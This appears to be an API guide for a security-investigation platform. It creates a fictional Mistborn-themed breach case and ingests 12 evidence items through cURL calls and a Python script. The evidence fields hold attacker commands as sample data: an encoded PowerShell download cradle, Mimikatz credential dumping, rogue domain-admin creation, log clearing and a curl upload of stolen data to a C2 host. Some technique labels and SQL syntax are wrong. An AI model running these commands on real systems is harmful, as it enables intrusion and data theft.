# Mistborn Themed Investigation API Demonstration

This guide provides step-by-step instructions, formatted JSON payloads, cURL commands, and a complete Python automation script demonstrating how to create an investigation and push 12 forensic evidence items.

**Key Design Elements:**
- **Zero Database PK Knowledge Required**: API calls reference human-readable identifiers:
  - Customers are referenced by their **Customer ID** string (`CANTON-FIN-01`).
  - Investigations are referenced by their **Investigation ID** string in the format **`INV123456`** (e.g. `INV000001`, `INV000009`, or `INV123456`).
- **Single-Item Ingestion**: Submitting an individual item via `POST /api/evidence/`.
- **Atomic Bulk Ingestion**: Submitting the remaining 11 items in a single atomic transaction via `POST /api/evidence/bulk_create/`.

---

## 1. Domain Configuration: Production vs Local Development

When targeting a deployed instance on a customer or corporate domain:
- **Production Domain**: The web application and reverse proxy (Nginx / ALB) listen on standard HTTPS (port 443). Nginx automatically proxies `/api/` requests internally to the Django backend.
  - **Base URL**: `https://soc-demo.aircooledcafe.com/api`
  - **Do NOT target port 8000 in production.** Port 8000 is internal to the container network and is not exposed to external clients.
- **Local Development**: When running locally without a reverse proxy or TLS cert:
  - **Base URL**: `http://localhost:8000/api` (direct backend) or `http://localhost:5173/api` (via Vite proxy)

Set your environment variables before running the commands below:
```bash
# Set to your domain (or http://localhost:8000/api for local development)
export API_BASE="https://soc-demo.aircooledcafe.com/api"
export API_TOKEN="YOUR_API_TOKEN_HERE"
```

---

## 2. Prerequisites: API Token Authentication

All requests require an API authentication token passed in the `Authorization` HTTP header:
```http
Authorization: Token <YOUR_API_TOKEN>
```

To obtain your token:
1. Log into the web interface.
2. Click your user avatar / name in the top right → **Account, Avatar & Preferences** → **Password & API Token**.
3. Copy your persistent API token (or click **Regenerate Token** to rotate it).

---

## Step 1: Ensure Target Customer Exists

Register or verify the customer organization using its business **Customer ID** (`CANTON-FIN-01`):

```bash
curl -s -X POST "${API_BASE}/customers/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Canton of Resource & Finance (Final Empire)",
    "customer_id": "CANTON-FIN-01",
    "notes": "Central administrative treasury & Atium storage registry, Luthadel, Scadrial."
  }'
```

*Response returns the customer object with its human-usable `"customer_id": "CANTON-FIN-01"`.*

---

## Step 2: Create the Investigation

Create the root investigation record. Notice that `customer` directly references `"CANTON-FIN-01"`—no internal database integer ID is required. You can also specify a custom `investigation_id` in format `INV123456`, or leave it blank to be auto-assigned.

```bash
curl -s -X POST "${API_BASE}/investigations/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "customer": "CANTON-FIN-01",
    "investigation_id": "INV123456",
    "title": "Operation Tenth Metal: Kredik Shaw Perimeter Breach & Atium Ledger Theft",
    "ticket_id": "CANTON-SEC-1024",
    "ticket_link": "https://canton.luthadel.example/tickets/CANTON-SEC-1024",
    "status": "INVESTIGATING",
    "lead_analyst": "Kelsier (Survivor of Hathsin)",
    "summary": "Skaa rebellion allomancer crew compromised perimeter bastion gateway GW-KREDIK-SHAW-01 via spear-phishing credential harvesting targeting Obligator accounts in the Canton of Finance. The intrusion escalated through lateral movement across the Ministry network (MINISTRY-LUTHADEL-AD), dumped LSASS hashes on admin workstation WRK-INQUISITOR-03, bypassed Steel Ministry monitoring via tin-burning obfuscated memory loaders, purged audit logs on DB-CANTON-RESOURCE, and staged 18.4 GB of encrypted financial ledgers and Atium reserve manifests (atium_reserves_998FE.7z) for HTTPS exfiltration to rogue dropsite 185.220.101.99 before containment.",
    "action_plan": "1. Sever all external gateway links from GW-KREDIK-SHAW-01 and isolate the Canton of Finance subnet.\n2. Revoke and rotate all Kerberos KRBTGT keys across the Active Directory forest.\n3. Verify air-gapped immutable backup integrity for DB-CANTON-RESOURCE.\n4. Reset credentials and revoke tokens for all high-ranking Obligator and Inquisitor accounts.\n5. Enable EDR kernel-driver blocklists across all Luthadel endpoints.",
    "immediate_actions": "Isolated compromised gateway GW-KREDIK-SHAW-01; revoked yomen.obligator credentials.",
    "long_term_actions": "Deploy multi-factor authentication across all engineering workstations; re-key certificates."
  }'
```

*Response returns the created investigation with its usable ID:*
```json
{
  "investigation_id": "INV123456",
  "customer_id": "CANTON-FIN-01",
  "title": "Operation Tenth Metal: Kredik Shaw Perimeter Breach & Atium Ledger Theft",
  "status": "INVESTIGATING",
  ...
}
```

---

## Step 3A: Ingest Single Evidence Item via Individual API Call

Submit Item 1 (Initial Access) individually using `POST /api/evidence/`. Notice that `"investigation"` directly references `"INV123456"`:

```bash
curl -s -X POST "${API_BASE}/evidence/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "investigation": "INV123456",
    "evidence_type": "ATOMIC",
    "analyst_name": "Sazed",
    "timestamp": "2026-11-04T00:15:22Z",
    "summary": "Spear-phishing email with malicious PDF attachment Canton_Tax_Mandate_998FE.pdf delivered to Prelan Aradan Yomen.",
    "affected_asset": "MAIL-LUTHADEL-01",
    "affected_user": "LUTHADEL\\yomen.obligator",
    "user_created_by_attacker": false,
    "malicious_hosts_ips": "185.220.101.99",
    "commands_run": "",
    "mitre_tactic": "Initial Access (TA0001)",
    "mitre_technique": "T1566.001 - Phishing: Spearphishing Attachment",
    "is_key_evidence": true,
    "notes": "Email bypassed initial anti-spam gateway via lookalike sender domain obligator-decrees.net."
  }'
```

**Response (201 Created):**
```json
{
  "id": 101,
  "investigation_id": "INV123456",
  "evidence_type": "ATOMIC",
  "evidence_type_display": "Atomic Event",
  "analyst_name": "Sazed",
  "summary": "Spear-phishing email with malicious PDF attachment Canton_Tax_Mandate_998FE.pdf delivered to Prelan Aradan Yomen.",
  "is_key_evidence": true,
  "created_at": "2026-11-04T00:16:00Z"
}
```

---

## Step 3B: Ingest Remaining 11 Items in Bulk via a Single API Call

Rather than issuing 11 separate HTTP requests, submit the remaining items in a single request to **`POST /api/evidence/bulk_create/`** referencing `"investigation": "INV123456"` (or `POST /api/investigations/INV123456/bulk-evidence/`).

This executes inside an **atomic transaction** and performs **a single timeline rebuild**:

```bash
curl -s -X POST "${API_BASE}/evidence/bulk_create/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "investigation": "INV123456",
    "items": [
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Vin",
        "timestamp": "2026-11-04T00:28:45Z",
        "summary": "Malicious PDF executes embedded macro exploiting Adobe Reader buffer overflow (CVE-2023-26369) spawning obfuscated PowerShell.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "c2.ashfall-collective.org",
        "commands_run": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjADIALgBhAHMAaABmAGEAbABsAC0AYwBvAGwAbABlAGMAdABpAHYAZQAuAG8AcgBnAC8AcwB0AGEAZwBlADEALgBwAHMAMQAnACkA",
        "mitre_tactic": "Execution (TA0002)",
        "mitre_technique": "T1204.002 - User Execution: Malicious File; T1059.001 - Command and Scripting Interpreter: PowerShell",
        "is_key_evidence": true,
        "notes": "Decoded PowerShell payload establishes encrypted beacon to c2.ashfall-collective.org."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Vin",
        "timestamp": "2026-11-04T00:35:10Z",
        "summary": "Scheduled task 'MinistryHealthCheck' registered to execute coppercloud.exe from C:\\ProgramData\\SteelMinistry\\ at system startup.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "coppercloud.exe",
        "commands_run": "schtasks.exe /create /tn \"SteelMinistry\\MinistryHealthCheck\" /tr \"C:\\ProgramData\\SteelMinistry\\coppercloud.exe\" /sc onlogon /ru SYSTEM",
        "mitre_tactic": "Persistence (TA0003)",
        "mitre_technique": "T1053.005 - Scheduled Task/Job: Scheduled Task",
        "is_key_evidence": false,
        "notes": "Coppercloud binary signed with stolen Canton of Orthodoxy code-signing certificate."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Ham",
        "timestamp": "2026-11-04T00:52:00Z",
        "summary": "Coppercloud payload injects reflective Cobalt Strike beacon into legitimate Windows service host svchost.exe.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "NT AUTHORITY\\SYSTEM",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "",
        "commands_run": "svchost.exe (PID: 4180 hollowed)",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1055.012 - Process Injection: Process Hollowing",
        "is_key_evidence": false,
        "notes": "Memory scanning detected unmapped executable region with RWX permissions."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Ham",
        "timestamp": "2026-11-04T01:22:15Z",
        "summary": "BloodHound collector executed to enumerate Active Directory trust relationships, high-value Inquisitors, and Tier-0 groups.",
        "affected_asset": "GW-KREDIK-SHAW-01",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "sharphound.exe, 20261104_canton_bloodhound.zip",
        "commands_run": "SharpHound.exe -c All -d ministry.luthadel.realm --zipfilename 20261104_canton_bloodhound.zip",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1087.002 - Account Discovery: Domain Account; T1069.002 - Permission Groups Discovery: Domain Groups",
        "is_key_evidence": true,
        "notes": "Adversary identified direct escalation path to WRK-INQUISITOR-03."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T01:48:50Z",
        "summary": "LSASS memory dumping via Mimikatz extracting cleartext NTLM hashes for High Prelan Inquisitor Kar.",
        "affected_asset": "WRK-INQUISITOR-03",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "mimikatz.exe",
        "commands_run": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "mitre_tactic": "Credential Access (TA0006); Privilege Escalation (TA0004)",
        "mitre_technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
        "is_key_evidence": true,
        "notes": "Compromised Domain Admin credentials for LUTHADEL\\adm_kar.inquisitor."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T02:15:10Z",
        "summary": "Lateral movement over WinRM port 5985 to Primary Domain Controller DC-LUTHADEL-01 using stolen Inquisitor credentials.",
        "affected_asset": "DC-LUTHADEL-01",
        "affected_user": "LUTHADEL\\adm_kar.inquisitor",
        "user_created_by_attacker": false,
        "malicious_hosts_ips": "10.10.100.42, 10.10.0.10",
        "commands_run": "Enter-PSSession -ComputerName DC-LUTHADEL-01 -Credential LUTHADEL\\adm_kar.inquisitor",
        "mitre_tactic": "Lateral Movement (TA0008)",
        "mitre_technique": "T1021.006 - Remote Services: Windows Remote Management",
        "is_key_evidence": false,
        "notes": "Windows Event 4104 records interactive PowerShell scriptblock execution on Domain Controller."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Sazed",
        "timestamp": "2026-11-04T02:35:40Z",
        "summary": "Rogue Domain Admin account LUTHADEL\\vin.mistborn created and added to Domain Admins and Enterprise Admins.",
        "affected_asset": "DC-LUTHADEL-01",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": true,
        "malicious_hosts_ips": "LUTHADEL\\vin.mistborn",
        "commands_run": "net user vin.mistborn EleventhMetal99! /add /domain & net group \"Domain Admins\" vin.mistborn /add /domain & net group \"Enterprise Admins\" vin.mistborn /add /domain",
        "mitre_tactic": "Persistence (TA0003); Privilege Escalation (TA0004)",
        "mitre_technique": "T1136.002 - Create Account: Domain Account; T1098 - Account Manipulation",
        "is_key_evidence": true,
        "notes": "Security Event ID 4720 generated on DC-LUTHADEL-01."
      },
      {
        "evidence_type": "SEARCH",
        "analyst_name": "Dockson",
        "timestamp": "2026-11-04T02:58:00Z",
        "end_timestamp": "2026-11-04T03:15:00Z",
        "summary": "Automated SQL dump of Atium reserve ledgers, Pits of Hathsin yields, and Canton tax balances from DB-CANTON-RESOURCE.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": true,
        "malicious_hosts_ips": "",
        "commands_run": "sqlcmd.exe -S DB-CANTON-RESOURCE -Q \"SELECT * FROM CantonResource.dbo.AtiumVaultLedgers INTO OUTFILE C:\\Temp\\atium_vaults.csv\"",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1505.001 - Data from Information Repositories; T1005 - Data from Local System",
        "is_key_evidence": true,
        "notes": "Total volume of extracted database tables: 18.4 GB."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Dockson",
        "timestamp": "2026-11-04T03:20:15Z",
        "summary": "Staged 18.4 GB of stolen Atium ledgers compressed and AES-256 encrypted using 7-Zip archive atium_reserves_998FE.7z.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": true,
        "malicious_hosts_ips": "atium_reserves_998FE.7z",
        "commands_run": "7za.exe a -t7z -p\"SurvivorOfHathsin!\" -mhe=on C:\\Windows\\Temp\\ashfall\\atium_reserves_998FE.7z C:\\Temp\\*.csv",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1560.001 - Archive Collected Data: Archive via Utility",
        "is_key_evidence": true,
        "notes": "Header encryption enabled (-mhe=on) to obstruct file inspection."
      },
      {
        "evidence_type": "SEARCH",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T03:45:00Z",
        "end_timestamp": "2026-11-04T04:05:00Z",
        "summary": "HTTPS outbound multi-part exfiltration of atium_reserves_998FE.7z to external drop server 185.220.101.99.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": true,
        "malicious_hosts_ips": "185.220.101.99, c2.ashfall-collective.org",
        "commands_run": "curl.exe -k -X POST https://c2.ashfall-collective.org/upload --data-binary @C:\\Windows\\Temp\\ashfall\\atium_reserves_998FE.7z",
        "mitre_tactic": "Exfiltration (TA0010)",
        "mitre_technique": "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol",
        "is_key_evidence": true,
        "notes": "NetFlow recorded sustained 120 Mbps outbound spike over TLS port 443."
      },
      {
        "evidence_type": "ATOMIC",
        "analyst_name": "Sazed",
        "timestamp": "2026-11-04T04:10:30Z",
        "summary": "Adversary purged Windows Security, System, and PowerShell Event Logs across all breached systems to hinder attribution.",
        "affected_asset": "DC-LUTHADEL-01, DB-CANTON-RESOURCE, GW-KREDIK-SHAW-01",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": true,
        "malicious_hosts_ips": "",
        "commands_run": "wevtutil.exe cl Security & wevtutil.exe cl System & wevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\"",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1070.001 - Indicator Removal: Clear Windows Event Logs",
        "is_key_evidence": true,
        "notes": "Security Event ID 1102 was generated before connection termination."
      }
    ]
  }'
```

**Response (201 Created):**
```json
{
  "status": "success",
  "count": 11,
  "items": [
    { "id": 102, "investigation_id": "INV123456", "summary": "Malicious PDF executes embedded macro...", ... },
    { "id": 103, "investigation_id": "INV123456", "summary": "Scheduled task 'MinistryHealthCheck'...", ... },
    ...
  ]
}
```

---

## 4. Complete Python Automation Script

This script automatically executes the entire workflow without knowing any database primary keys:
1. Targets your configured domain (or localhost).
2. Connects to Customer `"CANTON-FIN-01"` directly.
3. Creates the investigation `"INV123456"` referencing `"CANTON-FIN-01"`.
4. Posts **Item 1** via the individual single-item endpoint with `"investigation": "INV123456"`.
5. Posts **Items 2–12** in a single call via the **bulk endpoint** with `"investigation": "INV123456"`.
6. Queries `https://soc-demo.aircooledcafe.com/api/investigations/INV123456/` and verifies that all 12 items are in the timeline.

```python
#!/usr/bin/env python3
"""
Mistborn Themed SOC Investigation - Python Automation Script
Demonstrates:
  1. Connecting to customer domain (or local development)
  2. Customer setup & Investigation creation using human-readable IDs ('CANTON-FIN-01', 'INV123456')
  3. Single-item evidence ingestion (Item 1)
  4. High-performance bulk evidence ingestion (Items 2-12)
"""

import os
import sys
import requests

# Base URL: Use your deployed domain or local dev
# In production on soc-demo.aircooledcafe.com, target https://soc-demo.aircooledcafe.com/api (no port 8000)
API_BASE = os.environ.get("API_BASE", "https://soc-demo.aircooledcafe.com/api")
API_TOKEN = os.environ.get("API_TOKEN", "YOUR_API_TOKEN_HERE")

CUSTOMER_CODE = "CANTON-FIN-01"
INVESTIGATION_CODE = "INV123456"

headers = {
    "Authorization": f"Token {API_TOKEN}",
    "Content-Type": "application/json",
}

session = requests.Session()
session.headers.update(headers)

print(f"[*] Targeting API at: {API_BASE}")

# 1. Ensure Customer exists using human-readable customer_id
print(f"[*] Creating / verifying Customer '{CUSTOMER_CODE}'...")
customer_payload = {
    "name": "Canton of Resource & Finance (Final Empire)",
    "customer_id": CUSTOMER_CODE,
    "notes": "Central administrative treasury & Atium storage registry, Luthadel, Scadrial.",
}
cust_res = session.post(f"{API_BASE}/customers/", json=customer_payload)
if cust_res.status_code == 201:
    print(f"[+] Customer created with code: {CUSTOMER_CODE}")
else:
    print(f"[+] Customer '{CUSTOMER_CODE}' already registered and ready for use.")

# 2. Create Investigation referencing customer by CUSTOMER_CODE
print(f"[*] Creating Investigation '{INVESTIGATION_CODE}'...")
investigation_payload = {
    "customer": CUSTOMER_CODE,
    "investigation_id": INVESTIGATION_CODE,
    "title": "Operation Tenth Metal: Kredik Shaw Perimeter Breach & Atium Ledger Theft",
    "ticket_id": "CANTON-SEC-1024",
    "ticket_link": "https://canton.luthadel.example/tickets/CANTON-SEC-1024",
    "status": "INVESTIGATING",
    "lead_analyst": "Kelsier (Survivor of Hathsin)",
    "summary": "Skaa rebellion allomancer crew compromised perimeter bastion gateway GW-KREDIK-SHAW-01 via spear-phishing credential harvesting targeting Obligator accounts in the Canton of Finance. Intrusion escalated through lateral movement to DC-LUTHADEL-01, dumped LSASS memory, and exfiltrated 18.4 GB of encrypted Atium ledgers.",
}
inv_res = session.post(f"{API_BASE}/investigations/", json=investigation_payload)
inv_res.raise_for_status()
inv_data = inv_res.json()
inv_id = inv_data.get("investigation_id") or INVESTIGATION_CODE
print(f"[+] Created Investigation '{inv_id}': '{inv_data['title']}'")

# 3. Ingest Individual Item (Item 1) referencing INVESTIGATION_CODE
print(f"\n[*] [Single Ingest] Ingesting Item 1 into '{inv_id}' via POST /api/evidence/...")
item_1 = {
    "investigation": inv_id,
    "evidence_type": "ATOMIC",
    "analyst_name": "Sazed",
    "timestamp": "2026-11-04T00:15:22Z",
    "summary": "Spear-phishing email with malicious PDF attachment Canton_Tax_Mandate_998FE.pdf delivered to Prelan Aradan Yomen.",
    "affected_asset": "MAIL-LUTHADEL-01",
    "affected_user": "LUTHADEL\\yomen.obligator",
    "user_created_by_attacker": False,
    "malicious_hosts_ips": "185.220.101.99",
    "commands_run": "",
    "mitre_tactic": "Initial Access (TA0001)",
    "mitre_technique": "T1566.001 - Phishing: Spearphishing Attachment",
    "is_key_evidence": True,
    "notes": "Email bypassed initial anti-spam gateway via lookalike sender domain obligator-decrees.net.",
}
res_single = session.post(f"{API_BASE}/evidence/", json=item_1)
res_single.raise_for_status()
print(f"[+] [1/12] Created single item ID: {res_single.json()['id']} on {inv_id}")

# 4. Ingest Remaining 11 Items in Bulk (Items 2-12) referencing INVESTIGATION_CODE
print(f"\n[*] [Bulk Ingest] Ingesting remaining 11 items into '{inv_id}' via POST /api/evidence/bulk_create/...")
bulk_items = [
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Vin",
        "timestamp": "2026-11-04T00:28:45Z",
        "summary": "Malicious PDF executes embedded macro exploiting Adobe Reader buffer overflow (CVE-2023-26369) spawning obfuscated PowerShell.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "c2.ashfall-collective.org",
        "commands_run": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjADIALgBhAHMAaABmAGEAbABsAC0AYwBvAGwAbABlAGMAdABpAHYAZQAuAG8AcgBnAC8AcwB0AGEAZwBlADEALgBwAHMAMQAnACkA",
        "mitre_tactic": "Execution (TA0002)",
        "mitre_technique": "T1204.002 - User Execution: Malicious File; T1059.001 - Command and Scripting Interpreter: PowerShell",
        "is_key_evidence": True,
        "notes": "Decoded PowerShell payload establishes encrypted beacon to c2.ashfall-collective.org."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Vin",
        "timestamp": "2026-11-04T00:35:10Z",
        "summary": "Scheduled task 'MinistryHealthCheck' registered to execute coppercloud.exe from C:\\ProgramData\\SteelMinistry\\ at system startup.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "coppercloud.exe",
        "commands_run": "schtasks.exe /create /tn \"SteelMinistry\\MinistryHealthCheck\" /tr \"C:\\ProgramData\\SteelMinistry\\coppercloud.exe\" /sc onlogon /ru SYSTEM",
        "mitre_tactic": "Persistence (TA0003)",
        "mitre_technique": "T1053.005 - Scheduled Task/Job: Scheduled Task",
        "is_key_evidence": False,
        "notes": "Coppercloud binary signed with stolen Canton of Orthodoxy code-signing certificate."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Ham",
        "timestamp": "2026-11-04T00:52:00Z",
        "summary": "Coppercloud payload injects reflective Cobalt Strike beacon into legitimate Windows service host svchost.exe.",
        "affected_asset": "WRK-OBLIGATOR-07",
        "affected_user": "NT AUTHORITY\\SYSTEM",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "",
        "commands_run": "svchost.exe (PID: 4180 hollowed)",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1055.012 - Process Injection: Process Hollowing",
        "is_key_evidence": False,
        "notes": "Memory scanning detected unmapped executable region with RWX permissions."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Ham",
        "timestamp": "2026-11-04T01:22:15Z",
        "summary": "BloodHound collector executed to enumerate Active Directory trust relationships, high-value Inquisitors, and Tier-0 groups.",
        "affected_asset": "GW-KREDIK-SHAW-01",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "sharphound.exe, 20261104_canton_bloodhound.zip",
        "commands_run": "SharpHound.exe -c All -d ministry.luthadel.realm --zipfilename 20261104_canton_bloodhound.zip",
        "mitre_tactic": "Discovery (TA0007)",
        "mitre_technique": "T1087.002 - Account Discovery: Domain Account; T1069.002 - Permission Groups Discovery: Domain Groups",
        "is_key_evidence": True,
        "notes": "Adversary identified direct escalation path to WRK-INQUISITOR-03."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T01:48:50Z",
        "summary": "LSASS memory dumping via Mimikatz extracting cleartext NTLM hashes for High Prelan Inquisitor Kar.",
        "affected_asset": "WRK-INQUISITOR-03",
        "affected_user": "LUTHADEL\\yomen.obligator",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "mimikatz.exe",
        "commands_run": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
        "mitre_tactic": "Credential Access (TA0006); Privilege Escalation (TA0004)",
        "mitre_technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
        "is_key_evidence": True,
        "notes": "Compromised Domain Admin credentials for LUTHADEL\\adm_kar.inquisitor."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T02:15:10Z",
        "summary": "Lateral movement over WinRM port 5985 to Primary Domain Controller DC-LUTHADEL-01 using stolen Inquisitor credentials.",
        "affected_asset": "DC-LUTHADEL-01",
        "affected_user": "LUTHADEL\\adm_kar.inquisitor",
        "user_created_by_attacker": False,
        "malicious_hosts_ips": "10.10.100.42, 10.10.0.10",
        "commands_run": "Enter-PSSession -ComputerName DC-LUTHADEL-01 -Credential LUTHADEL\\adm_kar.inquisitor",
        "mitre_tactic": "Lateral Movement (TA0008)",
        "mitre_technique": "T1021.006 - Remote Services: Windows Remote Management",
        "is_key_evidence": False,
        "notes": "Windows Event 4104 records interactive PowerShell scriptblock execution on Domain Controller."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Sazed",
        "timestamp": "2026-11-04T02:35:40Z",
        "summary": "Rogue Domain Admin account LUTHADEL\\vin.mistborn created and added to Domain Admins and Enterprise Admins.",
        "affected_asset": "DC-LUTHADEL-01",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "LUTHADEL\\vin.mistborn",
        "commands_run": "net user vin.mistborn EleventhMetal99! /add /domain & net group \"Domain Admins\" vin.mistborn /add /domain & net group \"Enterprise Admins\" vin.mistborn /add /domain",
        "mitre_tactic": "Persistence (TA0003); Privilege Escalation (TA0004)",
        "mitre_technique": "T1136.002 - Create Account: Domain Account; T1098 - Account Manipulation",
        "is_key_evidence": True,
        "notes": "Security Event ID 4720 generated on DC-LUTHADEL-01."
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Dockson",
        "timestamp": "2026-11-04T02:58:00Z",
        "end_timestamp": "2026-11-04T03:15:00Z",
        "summary": "Automated SQL dump of Atium reserve ledgers, Pits of Hathsin yields, and Canton tax balances from DB-CANTON-RESOURCE.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "",
        "commands_run": "sqlcmd.exe -S DB-CANTON-RESOURCE -Q \"SELECT * FROM CantonResource.dbo.AtiumVaultLedgers INTO OUTFILE C:\\Temp\\atium_vaults.csv\"",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1505.001 - Data from Information Repositories; T1005 - Data from Local System",
        "is_key_evidence": True,
        "notes": "Total volume of extracted database tables: 18.4 GB."
    },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Dockson",
        "timestamp": "2026-11-04T03:20:15Z",
        "summary": "Staged 18.4 GB of stolen Atium ledgers compressed and AES-256 encrypted using 7-Zip archive atium_reserves_998FE.7z.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "atium_reserves_998FE.7z",
        "commands_run": "7za.exe a -t7z -p\"SurvivorOfHathsin!\" -mhe=on C:\\Windows\\Temp\\ashfall\\atium_reserves_998FE.7z C:\\Temp\\*.csv",
        "mitre_tactic": "Collection (TA0009)",
        "mitre_technique": "T1560.001 - Archive Collected Data: Archive via Utility",
        "is_key_evidence": True,
        "notes": "Header encryption enabled (-mhe=on) to obstruct file inspection."
    },
    {
        "evidence_type": "SEARCH",
        "analyst_name": "Kelsier",
        "timestamp": "2026-11-04T03:45:00Z",
        "end_timestamp": "2026-11-04T04:05:00Z",
        "summary": "HTTPS outbound multi-part exfiltration of atium_reserves_998FE.7z to external drop server 185.220.101.99.",
        "affected_asset": "DB-CANTON-RESOURCE",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "185.220.101.99, c2.ashfall-collective.org",
        "commands_run": "curl.exe -k -X POST https://c2.ashfall-collective.org/upload --data-binary @C:\\Windows\\Temp\\ashfall\\atium_reserves_998FE.7z",
        "mitre_tactic": "Exfiltration (TA0010)",
        "mitre_technique": "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Encrypted Non-C2 Protocol",
        "is_key_evidence": True,
        "notes": "NetFlow recorded sustained 120 Mbps outbound spike over TLS port 443."
      },
    {
        "evidence_type": "ATOMIC",
        "analyst_name": "Sazed",
        "timestamp": "2026-11-04T04:10:30Z",
        "summary": "Adversary purged Windows Security, System, and PowerShell Event Logs across all breached systems to hinder attribution.",
        "affected_asset": "DC-LUTHADEL-01, DB-CANTON-RESOURCE, GW-KREDIK-SHAW-01",
        "affected_user": "LUTHADEL\\vin.mistborn",
        "user_created_by_attacker": True,
        "malicious_hosts_ips": "",
        "commands_run": "wevtutil.exe cl Security & wevtutil.exe cl System & wevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\"",
        "mitre_tactic": "Defense Evasion (TA0005)",
        "mitre_technique": "T1070.001 - Indicator Removal: Clear Windows Event Logs",
        "is_key_evidence": True,
        "notes": "Security Event ID 1102 was generated before connection termination."
    }
]

bulk_payload = {
    "investigation": inv_id,
    "items": bulk_items,
}

res_bulk = session.post(f"{API_BASE}/evidence/bulk_create/", json=bulk_payload)
res_bulk.raise_for_status()
bulk_data = res_bulk.json()
print(f"[+] Bulk ingest completed! Added {bulk_data['count']} items in 1 atomic transaction.")

# 5. Verify Investigation Timeline using human-readable inv_id
print(f"\n[*] Verifying investigation timeline for '{inv_id}'...")
